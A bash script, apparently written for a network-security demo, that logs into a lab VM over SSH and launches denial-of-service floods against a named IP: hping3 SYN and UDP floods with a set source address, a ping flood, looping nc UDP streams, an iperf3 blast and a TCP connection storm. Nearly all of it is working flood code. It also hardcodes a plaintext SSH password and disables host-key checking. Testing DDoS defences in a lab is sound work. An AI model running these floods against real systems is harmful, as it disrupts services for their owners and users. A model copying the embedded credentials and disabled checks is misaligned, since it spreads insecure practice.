#!/bin/bash
# =============================================================================
# DDoS Traffic Simulation Script for Claw-a-thon Demo
# =============================================================================
# Mô phỏng traffic flood từ VM-175 (Internet side, 88.88.88.88)
# vào qua ge-0/0/47 đến target IP 14.238.122.111 (customer-001 proxy)
#
# Topology:
#   VM-175 (88.88.88.88) --[ge-0/0/47 (88.88.88.1)]-- GATEWAY --[ae10]--> VM-181 (14.238.122.111)
#
# Usage:
#   ./simulate_ddos_traffic.sh start   # Bắt đầu flood traffic
#   ./simulate_ddos_traffic.sh stop    # Dừng flood traffic
#   ./simulate_ddos_traffic.sh status  # Kiểm tra trạng thái
# =============================================================================

TARGET_IP="14.238.122.111"

# VM-175: Internet-side attacker (same subnet as ge-0/0/47)
VM175_IP="10.116.0.175"
VM175_PORT="8822"
VM175_USER="thinhle"
VM175_PASS='thinhle@123#'

# Traffic generation command — chạy trên VM-175
# Traffic sẽ đi: VM-175 (88.88.88.88 ens20) → ge-0/0/47 (88.88.88.1) → ae10 → VM-181 (14.238.122.111)
FLOOD_CMD='
echo "=== Starting DDoS traffic simulation to '"$TARGET_IP"' ==="
echo "Source: 88.88.88.88 (ens20) → ge-0/0/47 (88.88.88.1) → target"

# Tạo thư mục chứa PID files
mkdir -p /tmp/ddos_sim

# QUAN TRỌNG: bind traffic ra interface ens20 (88.88.88.88) để đi qua ge-0/0/47
SRC_IP="88.88.88.88"

# Method 1: hping3 SYN flood (nếu có)
if command -v hping3 &>/dev/null; then
    echo "[+] Starting hping3 SYN flood via ens20..."
    nohup hping3 -S --flood -p 80 -a "$SRC_IP" '"$TARGET_IP"' >/dev/null 2>&1 &
    echo $! > /tmp/ddos_sim/hping3_80.pid
    nohup hping3 -S --flood -p 443 -a "$SRC_IP" '"$TARGET_IP"' >/dev/null 2>&1 &
    echo $! > /tmp/ddos_sim/hping3_443.pid
    nohup hping3 --udp --flood -p 53 -a "$SRC_IP" '"$TARGET_IP"' >/dev/null 2>&1 &
    echo $! > /tmp/ddos_sim/hping3_udp.pid
fi

# Method 2: Ping flood qua ens20 (source IP 88.88.88.88)
echo "[+] Starting ping flood via ens20 (88.88.88.88)..."
nohup sudo ping -f -s 65507 -I ens20 '"$TARGET_IP"' >/dev/null 2>&1 &
echo $! > /tmp/ddos_sim/ping_flood.pid

# Method 3: Nhiều luồng UDP flood qua ens20
echo "[+] Starting 20 UDP flood streams via ens20..."
for i in $(seq 1 20); do
    nohup bash -c "while true; do dd if=/dev/urandom bs=64000 count=1 2>/dev/null | nc -u -w0 -s 88.88.88.88 '"$TARGET_IP"' $((10000 + i)) 2>/dev/null; done" >/dev/null 2>&1 &
    echo $! > /tmp/ddos_sim/udp_${i}.pid
done

# Method 4: iperf3 (nếu có)
if command -v iperf3 &>/dev/null; then
    echo "[+] Starting iperf3 UDP flood via ens20..."
    nohup iperf3 -c '"$TARGET_IP"' -u -b 1000M -t 600 -P 4 -B 88.88.88.88 >/dev/null 2>&1 &
    echo $! > /tmp/ddos_sim/iperf3.pid
fi

# Method 5: TCP connection storm
echo "[+] Starting TCP connection storm..."
for i in $(seq 1 10); do
    nohup bash -c "while true; do timeout 1 bash -c \"echo > /dev/tcp/'"$TARGET_IP"'/80\" 2>/dev/null; done" >/dev/null 2>&1 &
    echo $! > /tmp/ddos_sim/tcp_${i}.pid
done

echo ""
echo "=== DDoS simulation started. PID files in /tmp/ddos_sim/ ==="
ls /tmp/ddos_sim/ | wc -l
echo "processes launched"
'

# Lệnh dừng traffic
STOP_CMD='
echo "=== Stopping DDoS traffic simulation ==="

# Kill tất cả process bằng PID files
if [ -d /tmp/ddos_sim ]; then
    for pidfile in /tmp/ddos_sim/*.pid; do
        if [ -f "$pidfile" ]; then
            pid=$(cat "$pidfile")
            kill -9 "$pid" 2>/dev/null && echo "Killed PID $pid ($(basename $pidfile))"
        fi
    done
    rm -rf /tmp/ddos_sim
fi

# Fallback: kill tất cả flood processes
sudo killall -9 hping3 2>/dev/null
sudo killall -9 iperf3 2>/dev/null
sudo pkill -9 -f "ping -f" 2>/dev/null
sudo pkill -9 -f "nc -u -w0.*'"$TARGET_IP"'" 2>/dev/null
sudo pkill -9 -f "dd if=/dev/urandom" 2>/dev/null
sudo pkill -9 -f "/dev/tcp/'"$TARGET_IP"'" 2>/dev/null

echo "=== All DDoS simulation processes stopped ==="
'

# Lệnh kiểm tra status
STATUS_CMD='
echo "=== DDoS Simulation Status ==="
if [ -d /tmp/ddos_sim ]; then
    running=0
    for pidfile in /tmp/ddos_sim/*.pid; do
        if [ -f "$pidfile" ]; then
            pid=$(cat "$pidfile")
            if kill -0 "$pid" 2>/dev/null; then
                echo "  RUNNING: PID $pid ($(basename $pidfile))"
                running=$((running+1))
            else
                echo "  DEAD:    PID $pid ($(basename $pidfile))"
            fi
        fi
    done
    echo "Total running processes: $running"
else
    echo "No simulation running"
fi
'

# ─── Run on VM ───
run_on_vm() {
    local vm_ip=$1
    local vm_port=$2
    local vm_user=$3
    local vm_pass=$4
    local cmd=$5
    local vm_label=$6

    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "  📡 ${vm_label} (${vm_ip}:${vm_port})"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

    sshpass -p "$vm_pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 \
        -p "$vm_port" "${vm_user}@${vm_ip}" "$cmd"

    if [ $? -ne 0 ]; then
        echo "  ❌ Failed to connect to ${vm_label}"
        return 1
    fi
}

# ─── Main ───
case "${1:-help}" in
    start)
        echo "🚀 Starting DDoS Traffic Simulation"
        echo "   Target: $TARGET_IP (customer-001 proxy)"
        echo "   Source: VM-175 (88.88.88.88) → ge-0/0/47 → GATEWAY → ae10 → target"
        echo ""

        if ! command -v sshpass &>/dev/null; then
            echo "⚠️  sshpass not found. Installing..."
            sudo apt-get install -y sshpass 2>/dev/null || {
                echo "❌ Cannot install sshpass"
                exit 1
            }
        fi

        run_on_vm "$VM175_IP" "$VM175_PORT" "$VM175_USER" "$VM175_PASS" "$FLOOD_CMD" "VM-175 (Internet Attacker 88.88.88.88)"

        echo ""
        echo "✅ DDoS simulation traffic started!"
        echo "   Traffic path: 88.88.88.88 → ge-0/0/47 (88.88.88.1) → ae10 → 14.238.122.111"
        echo "   Run './scratch/simulate_ddos_traffic.sh stop' to stop."
        ;;

    stop)
        echo "🛑 Stopping DDoS Traffic Simulation"
        run_on_vm "$VM175_IP" "$VM175_PORT" "$VM175_USER" "$VM175_PASS" "$STOP_CMD" "VM-175 (Internet Attacker 88.88.88.88)"
        echo ""
        echo "✅ All simulation traffic stopped."
        ;;

    status)
        echo "📊 DDoS Traffic Simulation Status"
        run_on_vm "$VM175_IP" "$VM175_PORT" "$VM175_USER" "$VM175_PASS" "$STATUS_CMD" "VM-175 (Internet Attacker 88.88.88.88)"
        ;;

    *)
        echo "Usage: $0 {start|stop|status}"
        echo ""
        echo "  start   - Start DDoS traffic flood from VM-175 (Internet side)"
        echo "  stop    - Stop all flood traffic"
        echo "  status  - Check running flood processes"
        echo ""
        echo "Target: $TARGET_IP (customer-001-proxy-01)"
        echo "Source: VM-175 (88.88.88.88 → ge-0/0/47)"
        exit 1
        ;;
esac
